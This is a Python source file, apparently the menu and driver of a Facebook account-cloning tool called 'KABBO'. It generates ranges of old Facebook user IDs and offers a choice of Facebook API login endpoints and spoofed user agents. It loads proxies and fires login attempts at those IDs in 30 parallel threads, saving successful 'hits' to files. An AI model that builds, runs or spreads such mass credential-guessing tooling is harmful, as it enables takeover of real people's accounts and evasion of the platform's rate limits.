import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor as tred
from config import (rad, Y, G, W, CY, BL, RESET, DIM,
                    TOOL_NAME, TOOL_VERSION, TOOL_AUTHOR,
                    TOOL_FB, TOOL_GITHUB, TOOL_TG)
from utils import box_line
from login import login_1, login_2, login_3, login_4
from proxy import load_proxies
from uid import gen_uid_all_series, gen_uid_100003_100004, gen_uid_2009
from useragent import set_ua


def banner():
    os.system('cls' if 'win' in sys.platform else 'clear')
    print(f"""
{CY}  ██╗  ██╗ █████╗ ██████╗ ██████╗  ██████╗
{CY}  ██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗
{G}  █████╔╝ ███████║██████╔╝██████╔╝██║   ██║
{G}  ██╔═██╗ ██╔══██║██╔══██╗██╔══██╗██║   ██║
{Y}  ██║  ██╗██║  ██║██████╔╝██████╔╝╚██████╔╝
{Y}  ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝{RESET}
{DIM}  ─────────────────────────────────────────────{RESET}
  {W}Tool    {RESET} {DIM}│{RESET}  {G}{TOOL_NAME} {TOOL_VERSION}{RESET}
  {W}Author  {RESET} {DIM}│{RESET}  {Y}{TOOL_AUTHOR}{RESET}
  {W}Facebook{RESET} {DIM}│{RESET}  {CY}{TOOL_FB}{RESET}
  {W}GitHub  {RESET} {DIM}│{RESET}  {CY}{TOOL_GITHUB}{RESET}
  {W}Telegram{RESET} {DIM}│{RESET}  {CY}{TOOL_TG}{RESET}
{DIM}  ─────────────────────────────────────────────{RESET}
  {G}✦  WIFI + MOBILE DATA SUPPORTED{RESET}
{DIM}  ─────────────────────────────────────────────{RESET}""")


def _menu_item(key, label, desc=''):
    suffix = f"  {DIM}{desc}{RESET}" if desc else ''
    print(f"  {CY}[{W}{key}{CY}]{RESET}  {G}{label}{RESET}{suffix}")


def _prompt(label):
    val = input(f"\n  {CY}❯{RESET} {W}{label}{RESET} : {Y}").strip()
    sys.stdout.write(RESET)
    sys.stdout.flush()
    return val


def _prompt_int(label, min_val=1, max_val=999999):
    while True:
        raw = _prompt(f"{label}  {DIM}(e.g. 20000){RESET}")
        if raw.isdigit() and min_val <= int(raw) <= max_val:
            return int(raw)
        print(f"  {rad}✘  Enter a valid number between {min_val} and {max_val}.{RESET}")


def _select_ua():
    print(f"\n  {W}SELECT USER-AGENT{RESET}")
    box_line()
    items = [
        ('1',  'FB ANDROID',     'recommended'),
        ('2',  'FB LITE',        ''),
        ('3',  'MESSENGER',      ''),
        ('4',  'CHROME MOBILE',  ''),
        ('5',  'CHROME DESKTOP', ''),
        ('6',  'SAMSUNG BROWSER',''),
        ('7',  'OPERA MOBILE',   ''),
        ('8',  'FIREFOX MOBILE', ''),
        ('9',  'FIREFOX DESKTOP',''),
        ('10', 'EDGE MOBILE',    ''),
        ('11', 'MIXED FB',       'FB apps only'),
        ('12', 'MIXED MOBILE',   'mobile only'),
        ('13', 'MIXED ALL',      'all random'),
    ]
    for k, label, desc in items:
        _menu_item(k, label, desc)
    box_line()
    while True:
        choice = _prompt('SELECT UA').strip()
        if choice in [i[0] for i in items]:
            set_ua(choice)
            return
        print(f"  {rad}✘  Choose 1–13.{RESET}")


def _select_method():
    while True:
        print(f"\n  {W}SELECT METHOD{RESET}")
        box_line()
        _menu_item('A', 'METHOD 1', 'b-graph.facebook.com')
        _menu_item('B', 'METHOD 2', 'b-api.facebook.com')
        _menu_item('C', 'METHOD 3', 'graph.facebook.com')
        _menu_item('D', 'METHOD 4', 'api.facebook.com')
        box_line()
        meth = _prompt('METHOD').upper()
        if meth in ('A', 'B', 'C', 'D'):
            return meth
        print(f"  {rad}✘  Choose A, B, C or D.{RESET}")


def _run_pool(user_list, meth):
    import config
    config.loop = 0
    config.oks  = []
    load_proxies()
    banner()
    box_line('═', CY)
    print(f"  {W}Total IDs {RESET} {DIM}│{RESET}  {G}{len(user_list)}{RESET}")
    meth_names = {'A': 'METHOD 1', 'B': 'METHOD 2', 'C': 'METHOD 3', 'D': 'METHOD 4'}
    saved_map  = {'A': 'KABBO-M1-HITS.txt', 'B': 'KABBO-M2-HITS.txt', 'C': 'KABBO-M3-HITS.txt', 'D': 'KABBO-M4-HITS.txt'}
    print(f"  {W}Method    {RESET} {DIM}│{RESET}  {G}{meth_names[meth]}{RESET}")
    print(f"  {W}Tip       {RESET} {DIM}│{RESET}  {Y}Airplane Mode = best results{RESET}")
    box_line('═', CY)
    print()

    with tred(max_workers=30) as pool:
        for uid in user_list:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            elif meth == 'C':
                pool.submit(login_3, uid)
            elif meth == 'D':
                pool.submit(login_4, uid)

    # ── Summary ──────────────────────────────────────────────
    print()
    box_line('═', CY)
    print(f"  {W}SCAN COMPLETE{RESET}")
    box_line()
    print(f"  {W}Total Tried {RESET} {DIM}│{RESET}  {CY}{config.loop}{RESET}")
    print(f"  {W}Total Hits  {RESET} {DIM}│{RESET}  {G}{len(config.oks)}{RESET}")
    saved = f'/sdcard/{saved_map[meth]}'
    print(f"  {W}Saved To    {RESET} {DIM}│{RESET}  {Y}{saved}{RESET}")
    box_line('═', CY)
    input(f"\n  {DIM}Press Enter to return to menu...{RESET}")
    BNG_71_()


def BNG_71_():
    banner()
    print(f"\n  {W}SELECT MODULE{RESET}")
    box_line()
    _menu_item('A', 'OLD CLONE')
    box_line()
    choice = _prompt('CHOOSE')
    if choice.upper() in ('A', '1'):
        old_clone()
    else:
        print(f"\n  {rad}✘  Invalid option.{RESET}")
        time.sleep(1.2)
        BNG_71_()


def old_clone():
    banner()
    print(f"\n  {W}SELECT SERIES{RESET}")
    box_line()
    _menu_item('A', 'ALL SERIES',            '2010 – 2014 range')
    _menu_item('B', '100003 / 100004 SERIES', '2011 – 2012 range')
    _menu_item('C', '2009 SERIES', '1000000x–1000005x prefix')
    box_line()
    choice = _prompt('CHOOSE')
    if choice.upper() in ('A', '1'):
        old_One()
    elif choice.upper() in ('B', '2'):
        old_Tow()
    elif choice.upper() in ('C', '3'):
        old_Tree()
    else:
        print(f"\n  {rad}✘  Invalid option.{RESET}")
        time.sleep(1.2)
        old_clone()


def old_One():
    banner()
    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}ALL SERIES  (2010 – 2014){RESET}")
    box_line()
    print(f"  {DIM}[1]{RESET}  Range  {Y}1000000000 – 1999999999{RESET}")
    print(f"  {DIM}[2]{RESET}  Range  {Y}1000000000 – 4999999999{RESET}")
    box_line()
    ask   = _prompt('SELECT RANGE (1 / 2)')
    if ask not in ('1', '2'):
        ask = '1'
    limit = _prompt_int('TOTAL IDs')
    meth  = _select_method()
    _select_ua()
    _run_pool(gen_uid_all_series(limit, ask), meth)


def old_Tow():
    banner()
    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}100003 / 100004 SERIES{RESET}")
    box_line()
    limit = _prompt_int('TOTAL IDs')
    meth  = _select_method()
    _select_ua()
    _run_pool(gen_uid_100003_100004(limit), meth)


def old_Tree():
    banner()
    print(f"\n  {W}OLD CLONE  {DIM}│{RESET}  {G}2009 SERIES{RESET}")
    box_line()
    limit = _prompt_int('TOTAL IDs')
    meth  = _select_method()
    _select_ua()
    _run_pool(gen_uid_2009(limit), meth)
